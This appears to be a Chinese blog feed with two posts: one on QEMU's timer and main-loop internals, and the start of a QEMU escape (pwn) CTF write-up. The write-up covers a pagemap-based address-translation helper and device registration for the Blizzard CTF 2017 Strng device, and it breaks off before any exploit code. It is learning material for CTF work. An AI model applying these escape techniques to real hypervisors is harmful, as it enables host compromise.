? MAIN_LOOP_POLL_ERR : MAIN_LOOP_POLL_OK;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*再次调用main_loop_poll_notifiers中所有</span></span><br><span class="line"><span class="comment">    notifier的notify函数告知其检查这次poll的结果.*/</span></span><br><span class="line">    notifier_list_notify(&amp;main_loop_poll_notifiers, &amp;mlpoll);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (icount_enabled()) {</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * CPU thread can infinitely wait for event after</span></span><br><span class="line"><span class="comment">         * missing the warp</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        icount_start_warp_timer();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//可能有timer超时了,进行回调.</span></span><br><span class="line">    qemu_clock_run_all_timers();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>main_loop_wait每次计算main_loop_tlg中最近的deadline并进行阻塞,每次结束阻塞尝试qemu_clock_run_all_timers进行回调(若阻塞结束是因为超时,则应该进行timer回调,若是因为某个事件,仍然调用了qemu_clock_run_all_timers但并不会起作用.</p><p>不过有个特殊情况,os_host_main_loop_wait时最大阻塞时间使用的是进入阻塞之前计算出的deadline,当阻塞时间结束,意味着到达deadline,正好进行timer的callback.但如果在阻塞期间deadline提前了,继续阻塞等待之前的deadline可能导致新的deadline到达而未进行回调,产生错误.</p><p>这就是为什么在timer_mod_ns函数中,当deadline提前时需要调用timerlist_rearm(最终是qemu_notify_event)的原因:使os_host_main_loop_wait立刻返回并重新设置deadline.</p><p>当然也解释了这个对qemu_clock_run_all_timers看似无意义的调用.</p><blockquote><p>若阻塞结束是因为超时,则应该进行timer回调,若是因为某个事件,仍然调用了qemu_clock_run_all_timers但并不会起作用.</p></blockquote><p>最终确认QemuTimer上的callback函数会被调用.且参数可控.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*util/qemu-timer.c*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">timerlist_run_timers</span><span class="params">(QEMUTimerList *timer_list)</span></span><br><span class="line">{</span><br><span class="line">    QEMUTimer *ts;</span><br><span class="line">    <span class="type">int64_t</span> current_time;</span><br><span class="line">    <span class="type">bool</span> progress = <span class="literal">false</span>;</span><br><span class="line">    QEMUTimerCB *cb;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!qatomic_read(&amp;timer_list-&gt;active_timers)) {</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    qemu_event_reset(&amp;timer_list-&gt;timers_done_ev);</span><br><span class="line">    <span class="keyword">if</span> (!timer_list-&gt;clock-&gt;enabled) {</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (timer_list-&gt;clock-&gt;type) {</span><br><span class="line">    <span class="keyword">case</span> QEMU_CLOCK_REALTIME:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">case</span> QEMU_CLOCK_VIRTUAL:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> QEMU_CLOCK_HOST:</span><br><span class="line">        <span class="keyword">if</span> (!replay_checkpoint(CHECKPOINT_CLOCK_HOST)) {</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> QEMU_CLOCK_VIRTUAL_RT:</span><br><span class="line">        <span class="keyword">if</span> (!replay_checkpoint(CHECKPOINT_CLOCK_VIRTUAL_RT)) {</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Extract expired timers from active timers list and process them.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * In rr mode we need "filtered" checkpointing for virtual clock.  The</span></span><br><span class="line"><span class="comment">     * checkpoint must be recorded/replayed before processing any non-EXTERNAL timer,</span></span><br><span class="line"><span class="comment">     * and that must only be done once since the clock value stays the same. Because</span></span><br><span class="line"><span class="comment">     * non-EXTERNAL timers may appear in the timers list while it being processed,</span></span><br><span class="line"><span class="comment">     * the checkpoint can be issued at a time until no timers are left and we are</span></span><br><span class="line"><span class="comment">     * done".</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    current_time = qemu_clock_get_ns(timer_list-&gt;clock-&gt;type);</span><br><span class="line">    qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line">    <span class="keyword">while</span> ((ts = timer_list-&gt;active_timers)) {</span><br><span class="line">        <span class="keyword">if</span> (!timer_expired_ns(ts, current_time)) {</span><br><span class="line">            <span class="comment">/* No expired timers left.  The checkpoint can be skipped</span></span><br><span class="line"><span class="comment">             * if no timers fired or they were all external.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">/* Checkpoint for virtual clock is redundant in cases where</span></span><br><span class="line"><span class="comment">         * it's being triggered with only non-EXTERNAL timers, because</span></span><br><span class="line"><span class="comment">         * these timers don't change guest state directly.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (replay_mode != REPLAY_MODE_NONE</span><br><span class="line">            &amp;&amp; timer_list-&gt;clock-&gt;type == QEMU_CLOCK_VIRTUAL</span><br><span class="line">            &amp;&amp; !(ts-&gt;attributes &amp; QEMU_TIMER_ATTR_EXTERNAL)</span><br><span class="line">            &amp;&amp; !replay_checkpoint(CHECKPOINT_CLOCK_VIRTUAL)) {</span><br><span class="line">            qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* remove timer from the list before calling the callback */</span></span><br><span class="line">        timer_list-&gt;active_timers = ts-&gt;next;</span><br><span class="line">        ts-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        ts-&gt;expire_time = <span class="number">-1</span>;</span><br><span class="line">        cb = ts-&gt;cb;</span><br><span class="line">        opaque = ts-&gt;opaque;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* run the callback (the timer list can be modified) */</span></span><br><span class="line">        qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line">        cb(opaque);</span><br><span class="line">        qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line"></span><br><span class="line">        progress = <span class="literal">true</span>;</span><br><span class="line">    }</span><br><span class="line">    qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    qemu_event_set(&amp;timer_list-&gt;timers_done_ev);</span><br><span class="line">    <span class="keyword">return</span> progress;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="两个有趣的东西"><a href="#两个有趣的东西" class="headerlink" title="两个有趣的东西"></a>两个有趣的东西</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*include/sysemu/cpu-timers.h*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* icount - Instruction Counter API */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * icount enablement state:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 0 = Disabled - Do not count executed instructions.</span></span><br><span class="line"><span class="comment"> * 1 = Enabled - Fixed conversion of insn to ns via "shift" option</span></span><br><span class="line"><span class="comment"> * 2 = Enabled - Runtime adaptive algorithm to compute shift</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TCG</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> use_icount;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> icount_enabled() (use_icount)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> icount_enabled() 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * WITH_QEMU_LOCK_GUARD - Lock a lock object for scope</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @x: a lock object (currently one of QemuMutex, CoMutex, QemuSpin).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This macro defines a lock scope such that entering the scope takes the lock</span></span><br><span class="line"><span class="comment"> * and leaving the scope releases the lock.  Return statements are allowed</span></span><br><span class="line"><span class="comment"> * within the scope and release the lock.  Break and continue statements leave</span></span><br><span class="line"><span class="comment"> * the scope early and release the lock.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   WITH_QEMU_LOCK_GUARD(&amp;mutex) {</span></span><br><span class="line"><span class="comment"> *       ...</span></span><br><span class="line"><span class="comment"> *       if (error) {</span></span><br><span class="line"><span class="comment"> *           return; &lt;-- mutex is automatically unlocked</span></span><br><span class="line"><span class="comment"> *       }</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *       if (early_exit) {</span></span><br><span class="line"><span class="comment"> *           break;  &lt;-- leave this scope early</span></span><br><span class="line"><span class="comment"> *       }</span></span><br><span class="line"><span class="comment"> *       ...</span></span><br><span class="line"><span class="comment"> *   }</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WITH_QEMU_LOCK_GUARD(x) \</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 虚拟化 </category>
          
          <category> Qemu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Qemu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Qemu pwn的第一次尝试</title>
      <link href="/2023/Qemu-pwn%20study/"/>
      <url>/2023/Qemu-pwn%20study/</url>
      
        <content type="html"><![CDATA[<p>(<del>Qemu pwn == Kernel Mode的交互 + User Mode的利用</del></p><h2 id="gva-hva"><a href="#gva-hva" class="headerlink" title="gva -> hva"></a>gva -&gt; hva</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gva -&gt; gpa: 读/proc/self/pagemap获取gva对应的gpa</span><br><span class="line">gpa + hva_start == hva: 理解一下: Guset的物理内存是Host(Qemu进程)虚拟地址空间中一段连续的区域 </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><span id="more"></span><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311261411947.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">        Err(<span class="string">"open pagemap"</span>);</span><br><span class="line">    }</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="type">uint64_t</span>)addr);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="设备注册-识别-交互的关键结构体"><a href="#设备注册-识别-交互的关键结构体" class="headerlink" title="设备注册,识别,交互的关键结构体"></a>设备注册,识别,交互的关键结构体</h2><p>设备从注册到交互,以Blizzard CTF 2017 Strng为例:<br>type_register_static注册一个Type,在TypeInfo结构中设置Type的名称,父类,实例大小,实例初始化函数与类初始化函数,最终根据TypeInfo来生成一个TypeImpl的对象(该对象在堆上,反编译是找不到的).</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_strng_register_types</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> TypeInfo strng_info = {</span><br><span class="line">        .name          = <span class="string">"strng"</span>,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="keyword">sizeof</span>(STRNGState),</span><br><span class="line">        .instance_init = strng_instance_init,</span><br><span class="line">        .class_init    = strng_class_init,</span><br><span class="line">    };</span><br><span class="line"></span><br><span class="line">    type_register_static(&amp;strng_info);</span><br><span class="line">}</span><br><span class="line">type_init(pci_strng_register_types)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo pci_testdev_info = {</span><br><span class="line">        .name          = TYPE_PCI_TEST_DEV,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="keyword">sizeof</span>(PCITestDevState),</span><br><span class="line">        .class_init    = pci_testdev_class_init,</span><br><span class="line">};</span><br><span class="line">TypeImpl *<span class="title function_">type_register_static</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> type_register(info);</span><br><span class="line">}</span><br><span class="line">TypeImpl *<span class="title function_">type_register</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span></span><br><span class="line">{</span><br><span class="line">    assert(info-&gt;parent);</span><br><span class="line">    <span class="keyword">return</span> type_register_internal(info);</span><br><span class="line">}</span><br><span class="line"><span class="type">static</span> TypeImpl *<span class="title function_">type_register_internal</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span></span><br><span class="line">{</span><br><span class="line">    TypeImpl *ti;</span><br><span class="line">    ti = type_new(info);</span><br><span class="line">    type_table_add(ti);</span><br><span class="line">    <span class="keyword">return</span> ti;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>完整的TypeInfo,TypeImpl结构</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeInfo</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;</span><br><span class="line">    <span class="type">size_t</span> instance_size;</span><br><span class="line">    <span class="type">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="type">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="type">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line">    <span class="type">bool</span> abstract;</span><br><span class="line">    <span class="type">size_t</span> class_size;</span><br><span class="line">    <span class="type">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> (*class_finalize)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> *class_data;</span><br><span class="line">    InterfaceInfo *interfaces;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeImpl</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> class_size;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> instance_size;</span><br><span class="line">    <span class="type">size_t</span> instance_align;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *class_data;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="type">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="type">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> abstract;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;</span><br><span class="line">    TypeImpl *parent_type;</span><br><span class="line"></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> num_interfaces;</span><br><span class="line">    InterfaceImpl interfaces[MAX_INTERFACES];</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>QOM有一个基类,所有的类继承于它.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* include/qom/object.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TypeImpl</span> *<span class="title">Type</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span> <span class="title">ObjectClass</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    Type type;  </span><br><span class="line">    GSList *interfaces;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    ObjectUnparent *unparent;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/* include/qom/object.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TypeImpl</span> *<span class="title">Type</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span> <span class="title">ObjectClass</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        Type type;       <span class="comment">/* points to the current Type's instance */</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/qdev-core.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DeviceClass</span> {</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        ObjectClass parent_class;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/pci/pci.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCIDeviceClass</span> {</span></span><br><span class="line">        DeviceClass parent_class;</span><br><span class="line">        ...</span><br></pre></td></tr></tbody></table></figure><p>对应还有一个代表基类对象的Object.<br>本题是Object-&gt;Device-&gt;PCIDevice-&gt;Strng这样的继承关系.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">    PCIDevice pdev;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    MemoryRegion pmio;</span><br><span class="line">    <span class="type">uint32_t</span> addr;</span><br><span class="line">    <span class="type">uint32_t</span> regs[STRNG_MMIO_REGS];</span><br><span class="line">    <span class="type">void</span> (*srand)(<span class="type">unsigned</span> <span class="type">int</span> seed);</span><br><span class="line">    <span class="type">int</span> (*rand)(<span class="type">void</span>);</span><br><span class="line">    <span class="type">int</span> (*rand_r)(<span class="type">unsigned</span> <span class="type">int</span> *seed);</span><br><span class="line">} STRNGState;</span><br></pre></td></tr></tbody></table></figure><p>PCI设备类初始化方式: 设置设备对应的device_id,vendor_id等,使得该PCI设备能被识别,设置realize函数,当被识别时调用.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_class_init</span><span class="params">(ObjectClass *class, <span class="type">void</span> *data)</span></span><br><span class="line">{</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);</span><br><span class="line"></span><br><span class="line">    k-&gt;realize = pci_strng_realize;</span><br><span class="line">    k-&gt;vendor_id = PCI_VENDOR_ID_QEMU;</span><br><span class="line">    k-&gt;device_id = <span class="number">0x11e9</span>;</span><br><span class="line">    k-&gt;revision = <span class="number">0x10</span>;</span><br><span class="line">    k-&gt;class_id = PCI_CLASS_OTHERS;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* include/hw/pci/pci.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCIDeviceClass</span> 